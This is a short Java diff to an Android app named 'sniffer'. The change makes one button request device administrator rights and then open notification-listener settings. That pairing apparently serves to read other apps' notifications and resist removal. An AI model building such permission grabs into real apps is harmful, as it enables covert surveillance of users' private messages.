@@ -1,5 +1,7 @@
 package com.v8.global.sniffer;
 
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.os.Bundle;
 import android.provider.Settings;
@@ -24,6 +26,11 @@ public class MainActivity extends AppCompatActivity {
         btn.setTextColor(0xFFFFFFFF);
         
         btn.setOnClickListener(v -> {
+            // طلب الأدمن
+            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(this, AdminReceiver.class));
+            startActivity(adminIntent);
+            // فتح الإشعارات
             startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
         });
 
